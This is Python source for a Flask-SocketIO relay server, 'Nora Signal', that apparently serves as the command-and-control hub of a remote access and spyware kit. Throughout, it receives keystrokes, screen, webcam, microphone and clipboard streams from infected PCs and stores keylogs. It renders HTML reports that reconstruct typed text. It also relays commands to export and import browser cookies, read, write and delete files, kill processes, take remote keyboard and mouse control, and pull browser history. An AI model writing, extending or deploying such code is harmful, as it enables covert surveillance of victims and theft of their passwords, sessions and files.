"""
Nora Signal relay server.

Agents (PC clients) connect and emit:
  register        {"name": "<hostname>"}
  frame           {"data": "<base64 jpeg>"}
  key             {"char": "<key>", "time": "HH:MM:SS", "app": "..."}
  camera_frame    {"data": "<base64 jpeg>"}
  clipboard       {"text": "<text>"}

Hubs (viewers) connect and emit:
  hub_join        {}
  command         {"action":..., "_target": "<agent name>"}

The relay forwards agent events to all hubs (adding "_agent" key),
and hub commands to the named target agent.

Keylogs are stored to disk at NORA_KEYLOG_DIR (default: ./keylogs/).
GET /keylogs/<agent>  → standalone HTML report
GET /keylogs          → list all agents with saved keylogs
"""

from flask import Flask, send_from_directory, request as freq, Response, jsonify
from flask_socketio import SocketIO, emit, join_room
import os
import json
import time
import datetime

_DIR = os.path.dirname(os.path.abspath(__file__))
_KEYLOG_DIR = os.environ.get("NORA_KEYLOG_DIR", os.path.join(_DIR, "keylogs"))
os.makedirs(_KEYLOG_DIR, exist_ok=True)

app = Flask(__name__, static_folder=_DIR)
socketio = SocketIO(
    app,
    cors_allowed_origins="*",
    async_mode="threading",
    max_http_buffer_size=10 * 1024 * 1024,
)

agents = {}       # sid -> {"name": str}
name_to_sid = {}  # name -> sid
HUB_ROOM = "hubs"


def _agent_list():
    return [{"name": v["name"]} for v in agents.values()]


def _keylog_path(agent_name):
    safe = "".join(c if c.isalnum() or c in "-_." else "_" for c in agent_name)
    return os.path.join(_KEYLOG_DIR, f"{safe}.jsonl")


def _append_keylog(agent_name, event):
    """Append a key event to the agent's JSONL log file."""
    try:
        event["_ts"] = time.time()
        with open(_keylog_path(agent_name), "a", encoding="utf-8") as f:
            f.write(json.dumps(event, ensure_ascii=False) + "\n")
    except Exception:
        pass


def _load_keylogs(agent_name):
    path = _keylog_path(agent_name)
    if not os.path.exists(path):
        return []
    events = []
    try:
        with open(path, "r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if line:
                    try:
                        events.append(json.loads(line))
                    except Exception:
                        pass
    except Exception:
        pass
    return events


def _reconstruct_text(chars):
    """Turn a list of char strings into readable text, applying backspaces."""
    result = []
    for ch in chars:
        if ch == "⌫":
            if result:
                result.pop()
        elif ch == "↵":
            result.append("\n")
        else:
            result.append(ch)
    return "".join(result)


def _build_keylog_html(agent_name):
    """Build a beautiful standalone HTML keylog report."""
    events = _load_keylogs(agent_name)

    # Group into app sessions: consecutive events with same app = one session
    sessions = []
    current_app = None
    current_session = None
    for ev in events:
        app_name = ev.get("app", "Unknown")
        char = ev.get("char", "")
        ts = ev.get("time", "")
        srv_ts = ev.get("_ts", 0)
        if app_name != current_app:
            if current_session:
                sessions.append(current_session)
            current_app = app_name
            current_session = {
                "app": app_name,
                "start_time": ts,
                "start_ts": srv_ts,
                "chars": [],
                "events": [],
            }
        if current_session is not None:
            current_session["chars"].append(char)
            current_session["events"].append(ev)
    if current_session:
        sessions.append(current_session)

    # Build session HTML blocks
    session_blocks = []
    for i, sess in enumerate(sessions):
        text = _reconstruct_text(sess["chars"])
        text_html = ""
        for line in text.split("\n"):
            # Wrap special chars
            span_chars = []
            for ch in line:
                if ch in ("⇥", "↵", "⌫", "⎋", "⌦", "⇞", "⇟", "↑", "↓", "←", "→"):
                    span_chars.append(f'<span class="sp-key">{ch}</span>')
                else:
                    span_chars.append(ch.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;"))
            text_html += "<div class='typed-line'>" + ("".join(span_chars) or "&nbsp;") + "</div>"

        raw_count = len(sess["chars"])
        dt_str = ""
        if sess.get("start_ts"):
            try:
                dt_str = datetime.datetime.fromtimestamp(sess["start_ts"]).strftime("%Y-%m-%d %H:%M:%S")
            except Exception:
                dt_str = sess.get("start_time", "")

        app_parts = sess["app"].split(" — ", 1)
        proc_name = app_parts[0]
        win_title = app_parts[1] if len(app_parts) > 1 else ""

        session_blocks.append(f"""
        <div class="session-card" id="s{i}">
          <div class="session-header">
            <div class="session-app">
              <span class="proc-badge">{proc_name.replace("&","&amp;").replace("<","&lt;")}</span>
              {f'<span class="win-title">{win_title.replace("&","&amp;").replace("<","&lt;")}</span>' if win_title else ""}
            </div>
            <div class="session-meta">
              <span class="meta-time">{dt_str}</span>
              <span class="meta-count">{raw_count} keys</span>
            </div>
          </div>
          <div class="session-body">
            <div class="typed-text">{text_html if text_html else '<span class="no-text">— no printable text —</span>'}</div>
          </div>
        </div>""")

    sessions_html = "\n".join(session_blocks) if session_blocks else '<div class="empty-state">No keylog data recorded yet.</div>'

    total_keys = sum(len(s["chars"]) for s in sessions)
    unique_apps = len(set(s["app"] for s in sessions))
    first_ts = ""
    last_ts = ""
    if events:
        try:
            first_ts = datetime.datetime.fromtimestamp(events[0].get("_ts", 0)).strftime("%Y-%m-%d %H:%M")
            last_ts = datetime.datetime.fromtimestamp(events[-1].get("_ts", 0)).strftime("%Y-%m-%d %H:%M")
        except Exception:
            pass

    generated = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    return f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Keylog Report — {agent_name}</title>
<style>
  :root {{
    --bg: #f8fafc;
    --card: #ffffff;
    --border: #e2e8f0;
    --accent: #6366f1;
    --accent2: #8b5cf6;
    --text: #0f172a;
    --muted: #64748b;
    --proc: #dbeafe;
    --proc-text: #1e40af;
    --sp-key: #7c3aed;
    --green: #059669;
    --shadow: 0 1px 3px rgba(0,0,0,.08), 0 1px 2px rgba(0,0,0,.04);
    --shadow-lg: 0 10px 25px rgba(0,0,0,.08);
  }}
  * {{ box-sizing: border-box; margin: 0; padding: 0; }}
  body {{
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
    background: var(--bg);
    color: var(--text);
    line-height: 1.6;
  }}
  .top-bar {{
    background: linear-gradient(135deg, var(--accent) 0%, var(--accent2) 100%);
    color: #fff;
    padding: 24px 32px;
  }}
  .top-bar h1 {{ font-size: 1.5rem; font-weight: 700; letter-spacing: -0.02em; }}
  .top-bar .subtitle {{ opacity: 0.8; font-size: 0.9rem; margin-top: 2px; }}
  .stats-row {{
    display: flex; gap: 16px; flex-wrap: wrap;
    padding: 20px 32px;
    background: var(--card);
    border-bottom: 1px solid var(--border);
  }}
  .stat-pill {{
    background: var(--bg);
    border: 1px solid var(--border);
    border-radius: 999px;
    padding: 6px 16px;
    font-size: 0.82rem;
    color: var(--muted);
  }}
  .stat-pill strong {{ color: var(--text); }}
  .main {{ max-width: 960px; margin: 0 auto; padding: 24px 16px; }}
  .section-title {{
    font-size: 0.75rem; font-weight: 700; text-transform: uppercase;
    letter-spacing: 0.1em; color: var(--muted); margin-bottom: 12px;
  }}
  .session-card {{
    background: var(--card);
    border: 1px solid var(--border);
    border-radius: 12px;
    margin-bottom: 12px;
    box-shadow: var(--shadow);
    overflow: hidden;
  }}
  .session-header {{
    display: flex; justify-content: space-between; align-items: flex-start;
    gap: 12px;
    padding: 14px 18px;
    background: #f1f5f9;
    border-bottom: 1px solid var(--border);
  }}
  .session-app {{ display: flex; align-items: center; gap: 8px; flex-wrap: wrap; }}
  .proc-badge {{
    background: var(--proc); color: var(--proc-text);
    font-size: 0.78rem; font-weight: 700;
    padding: 3px 10px; border-radius: 6px;
    font-family: "SF Mono", "Fira Code", monospace;
  }}
  .win-title {{
    font-size: 0.82rem; color: var(--muted);
    max-width: 400px;
    white-space: nowrap; overflow: hidden; text-overflow: ellipsis;
  }}
  .session-meta {{
    display: flex; flex-direction: column; align-items: flex-end; gap: 2px;
    flex-shrink: 0;
  }}
  .meta-time {{ font-size: 0.75rem; color: var(--muted); }}
  .meta-count {{
    font-size: 0.72rem; font-weight: 600;
    background: #e0e7ff; color: var(--accent);
    padding: 2px 8px; border-radius: 999px;
  }}
  .session-body {{ padding: 14px 18px; }}
  .typed-text {{
    font-family: "SF Mono", "Fira Code", "Cascadia Code", monospace;
    font-size: 0.88rem;
    line-height: 1.8;
    word-break: break-all;
  }}
  .typed-line {{ min-height: 1.8em; }}
  .sp-key {{
    display: inline-block;
    background: #f3e8ff;
    color: var(--sp-key);
    border-radius: 4px;
    padding: 0 4px;
    font-size: 0.82em;
    margin: 0 1px;
  }}
  .no-text {{ color: var(--muted); font-style: italic; font-size: 0.85rem; }}
  .empty-state {{
    text-align: center; padding: 60px 20px;
    color: var(--muted); font-size: 1rem;
  }}
  .footer {{
    text-align: center; padding: 32px 16px;
    color: var(--muted); font-size: 0.78rem;
  }}
  @media (max-width: 600px) {{
    .top-bar {{ padding: 16px; }}
    .stats-row {{ padding: 12px 16px; gap: 8px; }}
    .session-header {{ flex-direction: column; gap: 8px; }}
    .session-meta {{ align-items: flex-start; }}
    .win-title {{ max-width: 100%; white-space: normal; }}
  }}
</style>
</head>
<body>
<div class="top-bar">
  <h1>Keylog Report</h1>
  <div class="subtitle">Agent: {agent_name} &nbsp;·&nbsp; Generated {generated}</div>
</div>
<div class="stats-row">
  <div class="stat-pill"><strong>{total_keys:,}</strong> total keystrokes</div>
  <div class="stat-pill"><strong>{len(sessions)}</strong> app sessions</div>
  <div class="stat-pill"><strong>{unique_apps}</strong> unique apps</div>
  {f'<div class="stat-pill">From <strong>{first_ts}</strong> to <strong>{last_ts}</strong></div>' if first_ts else ""}
</div>
<div class="main">
  <div class="section-title">App Sessions — chronological</div>
  {sessions_html}
</div>
<div class="footer">Nora Monitor · Keylog Report</div>
</body>
</html>"""


@app.route("/")
def index():
    return send_from_directory(_DIR, "hub.html")


@app.route("/hub.html")
def hub_html():
    return send_from_directory(_DIR, "hub.html")


@app.route("/keylogs")
def keylog_index():
    agents_with_logs = []
    try:
        for fname in os.listdir(_KEYLOG_DIR):
            if fname.endswith(".jsonl"):
                agent = fname[:-6]
                path = os.path.join(_KEYLOG_DIR, fname)
                size = os.path.getsize(path)
                mtime = os.path.getmtime(path)
                agents_with_logs.append({
                    "agent": agent,
                    "size": size,
                    "last_updated": datetime.datetime.fromtimestamp(mtime).strftime("%Y-%m-%d %H:%M:%S"),
                })
    except Exception:
        pass
    return jsonify(agents_with_logs)


@app.route("/keylogs/<path:agent_name>")
def keylog_report(agent_name):
    html = _build_keylog_html(agent_name)
    return Response(html, mimetype="text/html")


# ── Agent registration ────────────────────────────────────────────────────────

@socketio.on("register")
def on_register(data):
    sid = freq.sid
    name = str(data.get("name", "agent"))
    agents[sid] = {"name": name}
    name_to_sid[name] = sid
    emit("registered", {"name": name})
    socketio.emit("agent_list", _agent_list(), room=HUB_ROOM)


# ── Hub join ──────────────────────────────────────────────────────────────────

@socketio.on("hub_join")
def on_hub_join(_data=None):
    join_room(HUB_ROOM)
    emit("agent_list", _agent_list())


# ── Disconnect ────────────────────────────────────────────────────────────────

@socketio.on("disconnect")
def on_disconnect():
    sid = freq.sid
    info = agents.pop(sid, None)
    if info:
        if name_to_sid.get(info["name"]) == sid:
            del name_to_sid[info["name"]]
        socketio.emit("agent_list", _agent_list(), room=HUB_ROOM)


# ── Agent → Hub forwarding ────────────────────────────────────────────────────

def _make_fwd(event):
    def _handler(data):
        sid = freq.sid
        if not isinstance(data, dict):
            data = {}
        agent_name = agents.get(sid, {}).get("name", "?")
        data["_agent"] = agent_name
        if event == "key":
            _append_keylog(agent_name, dict(data))
        socketio.emit(event, data, room=HUB_ROOM)
    _handler.__name__ = f"fwd_{event}"
    return _handler

for _ev in ("frame", "key", "camera_frame", "clipboard", "ngrok_url", "audio", "win_frame"):
    socketio.on(_ev)(_make_fwd(_ev))


# ── Hub → Agent commands ──────────────────────────────────────────────────────

def _to_agent(data, event=None):
    target_name = data.get("_target")
    target_sid = name_to_sid.get(target_name)
    if target_sid:
        ev = event or "command"
        socketio.emit(ev, data, room=target_sid)


@socketio.on("command")
def on_command(data):
    _to_agent(data, "command")


@socketio.on("camera_on")
def on_camera_on(data):
    _to_agent(data, "camera_on")


@socketio.on("camera_off")
def on_camera_off(data):
    _to_agent(data, "camera_off")


@socketio.on("mic_on")
def on_mic_on(data):
    _to_agent(data, "mic_on")


@socketio.on("mic_off")
def on_mic_off(data):
    _to_agent(data, "mic_off")


# ── Process list (request/response) ──────────────────────────────────────────

@socketio.on("get_processes")
def on_get_processes(data):
    requester = freq.sid
    target_sid = name_to_sid.get(data.get("_target"))
    if target_sid:
        socketio.emit("get_processes", {"_requester": requester}, room=target_sid)


@socketio.on("processes_result")
def on_processes_result(data):
    requester = data.get("_requester")
    if requester:
        socketio.emit("processes_result", data, room=requester)


@socketio.on("kill_process")
def on_kill_process(data):
    target_sid = name_to_sid.get(data.get("_target"))
    if target_sid:
        socketio.emit("kill_process", data, room=target_sid)


# ── File manager (request/response) ──────────────────────────────────────────

def _fm_request(event, data):
    target_sid = name_to_sid.get(data.get("_target"))
    if target_sid:
        data["_requester"] = freq.sid
        socketio.emit(event, data, room=target_sid)

for _fmev in ("list_dir", "read_file", "write_file", "delete_path"):
    def _make_fm_handler(ev):
        def _h(data):
            _fm_request(ev, data)
        _h.__name__ = f"fm_{ev}"
        return _h
    socketio.on(_fmev)(_make_fm_handler(_fmev))


def _fm_response(event, data):
    requester = data.get("_requester")
    if requester:
        socketio.emit(event, data, room=requester)

for _rsev in ("dir_result", "file_data", "write_result", "delete_result"):
    def _make_rs_handler(ev):
        def _h(data):
            _fm_response(ev, data)
        _h.__name__ = f"rs_{ev}"
        return _h
    socketio.on(_rsev)(_make_rs_handler(_rsev))


# ── Cookie manager (request/response) ────────────────────────────────────────

@socketio.on("export_cookies")
def on_export_cookies(data):
    target_sid = name_to_sid.get(data.get("_target") if data else None)
    if target_sid:
        socketio.emit("export_cookies", {"_requester": freq.sid}, room=target_sid)

@socketio.on("cookies_data")
def on_cookies_data(data):
    requester = data.get("_requester")
    if requester:
        socketio.emit("cookies_data", data, room=requester)

@socketio.on("import_cookies")
def on_import_cookies(data):
    target_sid = name_to_sid.get(data.get("_target") if data else None)
    if target_sid:
        data["_requester"] = freq.sid
        socketio.emit("import_cookies", data, room=target_sid)

@socketio.on("import_result")
def on_import_result(data):
    requester = data.get("_requester")
    if requester:
        socketio.emit("import_result", data, room=requester)


# ── Window / desktop control (request/response) ───────────────────────────────

@socketio.on("list_windows")
def on_list_windows(data):
    requester = freq.sid
    target_sid = name_to_sid.get(data.get("_target"))
    if target_sid:
        socketio.emit("list_windows", {"_requester": requester}, room=target_sid)

@socketio.on("windows_list")
def on_windows_list(data):
    requester = data.get("_requester")
    if requester:
        socketio.emit("windows_list", data, room=requester)

for _wcev in ("win_key", "win_mouse", "desktop_cmd", "win_capture_start", "win_capture_stop"):
    def _make_wc_handler(ev):
        def _h(data):
            target_sid = name_to_sid.get(data.get("_target"))
            if target_sid:
                socketio.emit(ev, data, room=target_sid)
        _h.__name__ = f"wc_{ev}"
        return _h
    socketio.on(_wcev)(_make_wc_handler(_wcev))


# ── System info / history / screenshot / clipboard (request/response) ────

def _make_req_resp(req_event, resp_event):
    def _on_req(data):
        target_sid = name_to_sid.get((data or {}).get("_target"))
        if target_sid:
            payload = dict(data) if data else {}
            payload["_requester"] = freq.sid
            socketio.emit(req_event, payload, room=target_sid)
    _on_req.__name__ = f"rr_{req_event}"
    socketio.on(req_event)(_on_req)

    def _on_resp(data):
        requester = (data or {}).get("_requester")
        if requester:
            socketio.emit(resp_event, data, room=requester)
    _on_resp.__name__ = f"rr_{resp_event}"
    socketio.on(resp_event)(_on_resp)

for _rr in [
    ("get_sysinfo", "sysinfo_result"),
    ("get_history", "history_result"),
    ("take_screenshot", "screenshot_result"),
    ("clipboard_set", "clipboard_set_result"),
    ("send_notification", "notification_result"),
    ("get_wallpaper", "wallpaper_result"),
    ("set_wallpaper", "set_wallpaper_result"),
    ("get_programs", "programs_result"),
    ("get_netconns", "netconns_result"),
    ("get_startup", "startup_result"),
    ("remove_startup", "remove_startup_result"),
    ("volume_control", "volume_result"),
    ("get_monitors", "monitors_result"),
]:
    _make_req_resp(*_rr)


# ── Local dev entry point ─────────────────────────────────────────────────────

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    socketio.run(app, host="0.0.0.0", port=port, allow_unsafe_werkzeug=True)
